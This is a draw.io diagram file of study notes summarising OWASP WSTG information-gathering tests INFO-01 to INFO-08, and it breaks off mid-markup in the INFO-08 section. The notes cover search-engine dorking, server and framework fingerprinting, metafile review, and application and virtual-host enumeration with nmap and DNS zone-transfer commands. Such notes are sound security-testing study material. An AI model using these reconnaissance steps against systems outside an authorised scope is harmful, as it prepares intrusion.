<mxfile host="app.diagrams.net" agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 YaBrowser/24.1.0.0 Safari/537.36" version="29.3.6">
  <diagram id="Ta_qs10KrUM1-YHtu8ch" name="OWASP WSTG">
    <mxGraphModel dx="826" dy="450" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1654" pageHeight="1169" math="0" shadow="0">
      <root>
        <mxCell id="0" />
        <mxCell id="1" parent="0" />
        <mxCell id="eCl3sA1oc6k5Cc1LExgh-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INFO-01&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Conduct Search Engine Discovery Reconnaissance for Information Leakage&lt;/h1&gt;&lt;p&gt;&lt;b&gt;Direct&lt;/b&gt; and &lt;b&gt;indirect&lt;/b&gt; elements to search engine discovery and reconnaissance:&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Direct&lt;/b&gt; -&amp;nbsp;searching the indexes and the associated content from caches.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Indirect&lt;/b&gt; -&amp;nbsp;learning sensitive design and configuration information by searching forums, newsgroups, and tendering websites.&lt;/p&gt;&lt;p&gt;Use&amp;nbsp;robots.txt,&amp;nbsp;HTML meta tags,&amp;nbsp;authentication,&amp;nbsp;search engines tools to avoid content from indexing.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Identify what sensitive design and configuration information of the application, system, or organization is exposed directly (on the organization’s website) or indirectly (via third-party services).&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Use a search engine to search for potentially sensitive information.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Use different&amp;nbsp;search engines to generate results:&amp;nbsp;&lt;a href=&quot;https://www.baidu.com/&quot; style=&quot;background-color: transparent;&quot;&gt;Baidu&lt;/a&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;a href=&quot;https://www.bing.com/&quot;&gt;Bing&lt;/a&gt;, &lt;a href=&quot;https://commoncrawl.org/&quot;&gt;Common Crawl&lt;/a&gt;, &lt;a href=&quot;https://duckduckgo.com/&quot;&gt;DuckDuckGo&lt;/a&gt;, &lt;a href=&quot;https://www.google.com/&quot;&gt;Google&lt;/a&gt;, &lt;a href=&quot;https://archive.org/web/&quot;&gt;Web Archive&lt;/a&gt;, &lt;a href=&quot;https://www.startpage.com/&quot;&gt;StartPage&lt;/a&gt;, &lt;a href=&quot;https://www.shodan.io/&quot;&gt;Shodan&lt;/a&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Use&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Search Operators (&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;i&gt;operator:query&lt;/i&gt;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;):&amp;nbsp;&lt;/span&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;site&lt;/i&gt;,&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;inurl&lt;/i&gt;,&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;intitle&lt;/i&gt;,&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;intext&lt;/i&gt;,&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;inbody&lt;/i&gt;,&amp;nbsp;&lt;i style=&quot;&quot;&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;filetype&lt;/span&gt;,&amp;nbsp;&lt;/i&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;cache&lt;/i&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;.&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Use&amp;nbsp;&lt;a href=&quot;https://www.exploit-db.com/google-hacking-database&quot;&gt;Google Hacking Database&lt;/a&gt;.&lt;/span&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Carefully consider the sensitivity of design and configuration information before it is posted online.&lt;/p&gt;&lt;p&gt;Periodically review the sensitivity of existing design and configuration information that is posted online.&lt;/p&gt;" vertex="1">
          <mxGeometry height="620" width="400" x="40" y="80" as="geometry" />
        </mxCell>
        <mxCell id="oaayevychgkSF5dlrHyh-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INFO-02&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Fingerprint Web Server&lt;/h1&gt;&lt;p&gt;Web server fingerprinting is the task of identifying the type and version of web server that a target is running on.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Determine the version and type of a running web server to enable further discovery of any known vulnerabilities.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;b&gt;Banner Grabbing&lt;/b&gt;:&lt;/p&gt;&lt;p&gt;A banner grab is performed by sending an HTTP request to the web server and examining its response header (&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;i style=&quot;&quot;&gt;Server: Apache/2.4.41 (Unix)&lt;/i&gt;, &lt;i style=&quot;&quot;&gt;Server: nginx/1.17.3&lt;/i&gt;,&amp;nbsp;&lt;i style=&quot;&quot;&gt;Server: lighttpd/1.4.54&lt;/i&gt;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;p&gt;In cases where the server information is obscured, testers may guess the type of server based on the ordering of the header fields, but this method is not definite.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Sending Malformed Requests&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;Web servers may be identified by examining their error responses, and in the cases where they have not been customized, their default error pages.&lt;br&gt;&lt;/p&gt;&lt;p&gt;As default error pages offer many differentiating factors between types of web servers, their examination can be an effective method for fingerprinting even when server header fields are obscured.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Using Automated Scanning Tools&lt;/b&gt;:&lt;/p&gt;&lt;p&gt;Automated tools send other more server-specific probes,&amp;nbsp;&lt;span style=&quot;background-color: transparent;&quot;&gt;can compare responses from web servers much faster than manual testing, and utilize large databases of known responses to attempt server identification (&lt;/span&gt;&lt;a style=&quot;background-color: transparent;&quot; href=&quot;https://toolbar.netcraft.com/site_report&quot;&gt;NetCraft&lt;/a&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;, &lt;/span&gt;&lt;a style=&quot;background-color: transparent;&quot; href=&quot;https://github.com/sullo/nikto&quot;&gt;Nikto&lt;/a&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;, &lt;/span&gt;&lt;a style=&quot;background-color: transparent;&quot; href=&quot;https://nmap.org/&quot;&gt;Nmap&lt;/a&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;, &lt;/span&gt;&lt;a style=&quot;background-color: transparent;&quot; href=&quot;https://nmap.org/zenmap/&quot;&gt;Zenmap&lt;/a&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Obscuring web server information in headers (&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;a href=&quot;https://httpd.apache.org/docs/current/mod/mod_headers.html&quot;&gt;Apache’s mod_headers module&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Using a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.&lt;/p&gt;&lt;div&gt;&lt;div&gt;Ensuring that web servers are kept up-to-date with the latest software and security patches.&lt;/div&gt;&lt;/div&gt;" vertex="1">
          <mxGeometry height="700" width="400" x="40" y="700" as="geometry" />
        </mxCell>
        <mxCell id="oaayevychgkSF5dlrHyh-3" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INFO-03&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Review Webserver Metafiles for Information Leakage&lt;/h1&gt;&lt;p&gt;Testing various metadata files for information leakage of the web application’s path(s), or functionality.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Identify hidden or obfuscated paths and functionality through the analysis of metadata files.&lt;/li&gt;&lt;li&gt;Extract and map other information that could lead to better understanding of the systems at hand.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;b&gt;Robots&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;Web Spiders, Robots, or Crawlers retrieve a web page and then recursively traverse hyperlinks to retrieve further web content.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Their accepted behavior is specified by the &lt;a href=&quot;https://www.robotstxt.org/&quot;&gt;Robots Exclusion Protocol&lt;/a&gt; of the robots.txt file in the web root directory (but robots can ignore Disallow directives from robots.txt also).&lt;/p&gt;&lt;p&gt;&lt;b&gt;META Tags&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;&amp;lt;META&amp;gt; tags are located within the HEAD section of each HTML document and should be consistent across a web site in the event that the robot/spider/crawler start point does not begin from a document link other than webroot.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Robots META Tag - &lt;i&gt;&amp;lt;META NAME=&quot;ROBOTS&quot; CONTENT=&quot;(NO)INDEX, (NO)FOLLOW&quot;&amp;gt;&lt;/i&gt;.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Miscellaneous META Information Tags&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;Organizations often embed informational META tags in web content to support various technologies such as screen readers, social networking previews, search engine indexing, etc.&lt;/p&gt;&lt;p&gt;&lt;i&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;meta property=&quot;og:url&quot; content=&quot;https://www.whitehouse.gov/&quot; /&amp;gt;&lt;br&gt;&amp;lt;meta name=&quot;twitter:card&quot; content=&quot;summary_large_image&quot; /&amp;gt;&lt;br&gt;&amp;lt;meta name=&quot;twitter:site&quot; content=&quot;@whitehouse&quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Such meta-information can be of value to testers in identifying technologies used, and additional paths/functionality to explore and test.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Sitemaps&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;A sitemap.xml is a file where a developer or organization can provide information about the pages, videos, and other files offered by the site or application, and the relationship between them.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Search engines can use this file to more intelligently explore your site. Testers can use sitemap.xml files to learn more about the site or application to explore it more completely.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Security TXT&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;Security.txt is a &lt;a href=&quot;https://securitytxt.org/&quot;&gt;proposed standard&lt;/a&gt; which allows websites to define security policies and contact details.&lt;br&gt;&lt;/p&gt;&lt;p&gt;The file may be present either in the root of the webserver or in the .well-known/ directory.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Humans TXT&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://humanstxt.org/&quot;&gt;humans.txt&lt;/a&gt; is an initiative for knowing the people behind a website.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Other .well-known Information Sources&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;There are other &lt;a href=&quot;https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml&quot;&gt;RFCs&lt;/a&gt; and &lt;a href=&quot;https://en.wikipedia.org/wiki/Well-known_URI#List_of_well-known_URIs&quot;&gt;Internet drafts&lt;/a&gt; which suggest standardized uses of files within the .well-known/ directory.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tools:&amp;nbsp;Browser,&amp;nbsp;curl,&amp;nbsp;wget,&amp;nbsp;Burp Suite,&amp;nbsp;ZAP.&lt;/p&gt;" vertex="1">
          <mxGeometry height="1100" width="400" x="40" y="1400" as="geometry" />
        </mxCell>
        <mxCell id="jR8E7OnR5_9fku_goPyS-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INFO-04&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Enumerate Applications on Webserver&lt;/h1&gt;&lt;p&gt;It is not uncommon to have multiple web sites or applications whose symbolic names resolve to the same IP address.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Enumerate the applications within scope that exist on a web server.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;b&gt;Different Base URL&lt;/b&gt;:&lt;/p&gt;&lt;p&gt;The URLs &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.example.com/&lt;b style=&quot;&quot;&gt;url1&lt;/b&gt;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.example.com/&lt;b style=&quot;&quot;&gt;url2&lt;/b&gt;&lt;/i&gt; and &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.example.com/&lt;b style=&quot;&quot;&gt;url3&lt;/b&gt;&lt;/i&gt; referred to different applications.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Use vulnerability scanners (it may be possible to spot applications via&amp;nbsp;directory browsing at&amp;nbsp;mis-configured&amp;nbsp;web server).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Use the &lt;i&gt;site&lt;/i&gt; operator of search engines (if the application is referenced by other web pages or spidered and indexed by web search engines).&lt;/p&gt;&lt;p&gt;Use&amp;nbsp;dictionary-style searching&amp;nbsp;(&quot;intelligent guessing&quot;) to check&amp;nbsp;likely candidates&amp;nbsp;for non-published applications (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;https://www.example.com/webmail&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;https://webmail.example.com/&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;https://mail.example.com/&lt;/i&gt; for &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;https://www.example.com&lt;/i&gt;).&lt;/p&gt;&lt;p&gt;&lt;b style=&quot;background-color: transparent;&quot;&gt;Non-standard Ports&lt;/b&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;:&lt;/span&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Applications may be hosted at diifferent from standart HTTP(S) 80 and 443 ports -&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.example.com:&lt;b style=&quot;&quot;&gt;20000&lt;/b&gt;&lt;/i&gt;.&lt;/p&gt;&lt;p&gt;Use &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;nmap –Pn –sT –sV –p0-65535 192.168.1.100&lt;/i&gt;.&lt;/p&gt;&lt;p&gt;Use&amp;nbsp;vulnerability scanners (check the ability to identify HTTP[S]).&lt;/p&gt;&lt;p&gt;&lt;b&gt;Virtual Hosts&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;The IP address 192.168.1.100 might be associated to DNS names &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;www.example.com&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b style=&quot;&quot;&gt;helpdesk&lt;/b&gt;.example.com&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b style=&quot;&quot;&gt;webmail&lt;/b&gt;.example.com&lt;/i&gt;.&lt;br&gt;&lt;/p&gt;&lt;p&gt;DNS Zone Transfers (&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;i style=&quot;&quot;&gt;host -t ns domain.com&lt;/i&gt; -&amp;gt; &lt;i style=&quot;&quot;&gt;host -l domain.com ns.domain.com&lt;/i&gt;&lt;/span&gt;).&lt;br&gt;&lt;/p&gt;&lt;p&gt;DNS Inverse Queries (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;dig -x 192.0.2.1&lt;/i&gt;).&lt;/p&gt;&lt;p&gt;Reverse-IP Services (&lt;a href=&quot;https://www.domaintools.com/reverse-ip/&quot;&gt;Domain Tools Reverse IP&lt;/a&gt;, &lt;a href=&quot;https://www.dnsstuff.com/&quot;&gt;DNSstuff&lt;/a&gt;, &lt;a href=&quot;https://web.archive.org/web/20190515092354/http://www.net-square.com/mspawn.html&quot;&gt;Net Square&lt;/a&gt;).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Googling (see&amp;nbsp;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;b&gt;WSTG-INFO-01&lt;/b&gt;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Tools: host, nslookup, dig, s&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;earch engines,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Specialized DNS-related web-based search services, &lt;a href=&quot;https://nmap.org/&quot;&gt;Nmap&lt;/a&gt;, &lt;a href=&quot;https://www.tenable.com/products/nessus&quot;&gt;Nessus&lt;/a&gt;, &lt;a href=&quot;https://www.cirt.net/nikto2&quot;&gt;Nikto&lt;/a&gt;.&lt;/span&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="780" width="400" x="40" y="2500" as="geometry" />
        </mxCell>
        <mxCell id="jR8E7OnR5_9fku_goPyS-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INFO-05&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Review Webpage Content for Information Leakage&lt;/h1&gt;&lt;p&gt;Comments and metadata review should be done in order to determine if any information is being leaked.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Similar to the comments and metadata in HTML code, many programmers also hardcod sensitive information in JavaScript variables on the front-end.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Review webpage comments and metadata to find any information leakage.&lt;/li&gt;&lt;li&gt;Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.&lt;/li&gt;&lt;li&gt;Identify if source map files or other front-end debug files exist.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;b&gt;Review webpage comments and metadata&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;Check HTML source code for comments containing sensitive information (&quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;!--&lt;/i&gt;&quot;).&lt;/p&gt;&lt;p&gt;Check HTML version information for valid version numbers and Data Type Definition (DTD) URLs (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;strict.dtd&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;loose.dtd&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;frameset.dtd&lt;/i&gt;).&lt;/p&gt;&lt;p&gt;CHeck META tags (profiling info, not &lt;a href=&quot;https://www.w3.org/WAI/standards-guidelines/wcag/&quot;&gt;WCAG&lt;/a&gt; compliant).&lt;/p&gt;&lt;p&gt;&lt;b&gt;Identifying JavaScript Code and Gathering JavaScript Files&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;Check JavaScript source code in &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;script&amp;gt;&lt;/i&gt; tag block.&lt;/p&gt;&lt;p&gt;Identify external JavaScript files to review the code (&quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;*.js&lt;/i&gt;&quot;).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Check JavaScript source code for any sensitive information leaks.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Identifying Source Map Files&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;Testers can also find source map files by adding the “&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;.map&lt;/i&gt;” extension after the extension of each external JavaScript file.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://www.gnu.org/software/wget/wget.html&quot;&gt;wget&lt;/a&gt;, &lt;a href=&quot;https://curl.haxx.se/&quot;&gt;curl&lt;/a&gt;, Browser DevTools, &lt;a href=&quot;https://portswigger.net/burp&quot;&gt;Burp Suite&lt;/a&gt;, &lt;a href=&quot;https://github.com/tomnomnom/waybackurls&quot;&gt;Wayback URLs&lt;/a&gt;, &lt;a href=&quot;https://github.com/ozguralp/gmapsapiscanner/&quot;&gt;Google Maps API Scanner&lt;/a&gt;, &lt;a href=&quot;https://github.com/streaak/keyhacks&quot;&gt;KeyHacks&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="680" width="400" x="40" y="3280" as="geometry" />
        </mxCell>
        <mxCell id="kxqWSQLsrTnDQ2H8gNHa-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INFO-06&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Identify Application Entry Points&lt;/h1&gt;&lt;p&gt;Identify and map out areas within the application that should be investigated once enumeration and mapping have been completed.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Identify possible entry and injection points through request and response analysis.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Pay attention to all HTTP requests as well as every parameter and form field that is passed to the application.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Use a tool such as an intercepting proxy&amp;nbsp;to see the parameters sent in the body of requests such as a POST request.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Make special note of any hidden form fields that are being passed to the application, as these usually contain sensitive information.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Make a spreadsheet with the research results.&lt;/p&gt;&lt;p&gt;The spreadsheet should include the page requested,&amp;nbsp;the interesting parameters, the type of request,&amp;nbsp;if access is authenticated/unauthenticated, if TLS is used, if it’s part of a multi-step process, if WebSockers are used, and any other relevant notes.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Requests&lt;/b&gt;:&lt;/p&gt;&lt;p&gt;Identify where new cookies are set (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Set-Cookie&lt;/i&gt; header), modified, or added to.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Identify where there are any redirects (3xx HTTP status code), 400 status codes, in particular 403 Forbidden, and 500 internal server errors during normal responses (i.e., unmodified requests).&lt;/p&gt;&lt;p&gt;Also note where any interesting headers are used (Server: BIG-IP).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Black-Box Testing (analyzing only requests and responses).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Gray-Box Testing (contact with the application developers to identify any functions that would accept or expect user input and how they are formatted).&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;OWASP Attack Surface Detector&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;This tool investigates the source code and uncovers the endpoints of a web application, the parameters these endpoints accept, and the data type of those parameters (more info than from spider).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Available as a CLI-tool and as a plugin to both &lt;a href=&quot;https://github.com/secdec/attack-surface-detector-zap/wiki&quot;&gt;ZAP&lt;/a&gt; and &lt;a href=&quot;https://github.com/secdec/attack-surface-detector-burp/wiki&quot;&gt;Burp Suite&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;, &lt;a href=&quot;https://www.portswigger.net/burp/&quot;&gt;Burp Suite&lt;/a&gt;, &lt;a href=&quot;https://www.telerik.com/fiddler&quot;&gt;Fiddler&lt;/a&gt;,&amp;nbsp;&lt;a href=&quot;https://owasp.org/www-project-attack-surface-detector/&quot;&gt;OWASP Attack Surface Detector&lt;/a&gt;, &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc2616&quot;&gt;RFC 2616 - HTTP&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="800" width="400" x="40" y="3960" as="geometry" />
        </mxCell>
        <mxCell id="kxqWSQLsrTnDQ2H8gNHa-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INFO-07&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Map Execution Paths Through Application&lt;/h1&gt;&lt;p&gt;Completely understand the structure of the application, before commencing security testing.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Map the target application and understand the principal workflows.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;There are several ways to approach the testing and measurement of code coverage:&lt;br&gt;&lt;b&gt;Path&lt;/b&gt; -&amp;nbsp;test each of the paths through an application that includes combinatorial and boundary value analysis testing for each decision path.&lt;br&gt;&lt;b&gt;Data Flow&amp;nbsp;(or Taint Analysis)&lt;/b&gt; -&amp;nbsp;tests the assignment of variables via external interaction (normally users). Focuses on mapping the flow, transformation and use of data throughout an application.&lt;br&gt;&lt;b&gt;Race&lt;/b&gt; -&amp;nbsp;tests multiple concurrent instances of the application manipulating the same data.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Code Review&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;Typical for gray-box and white-box approach to testing.&lt;br&gt;&lt;/p&gt;&lt;p&gt;DAST tools can facilitate the use of a web server agent.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Automatic Spidering&lt;/b&gt;:&lt;br&gt;&lt;/p&gt;&lt;p&gt;These tools are used to automatically discover new resources (URLs) on a particular website (&lt;a href=&quot;https://www.zaproxy.org/docs/desktop/start/features/spider/&quot;&gt;Spider&lt;/a&gt;, &lt;a href=&quot;https://www.zaproxy.org/docs/desktop/addons/ajax-spider/&quot;&gt;AJAX Spider&lt;/a&gt;, &lt;a href=&quot;https://www.zaproxy.org/docs/desktop/addons/openapi-support/&quot;&gt;OpenAPI&lt;/a&gt; modes).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://github.com/zaproxy/zaproxy&quot;&gt;ZAP&lt;/a&gt;, &lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_spreadsheet_software&quot;&gt;speadsheet software&lt;/a&gt;, &lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_concept-_and_mind-mapping_software&quot;&gt;diagramming software&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="540" width="400" x="40" y="4760" as="geometry" />
        </mxCell>
        <mxCell id="121xtI7DQUFuoj_CItQ1-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INFO-08&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Fingerprint Web Application Framework&lt;/h1&gt;&lt;p&gt;Well known web application components have known HTML headers, cookies, and directory structures that can be enumerated to identify the application.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Fingerprint the components being used by the web applications.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;b&gt;HTTP headers&lt;/b&gt;: carefully inspect every HTTP-header for framework name and version leaks (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;X-Powered-By&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 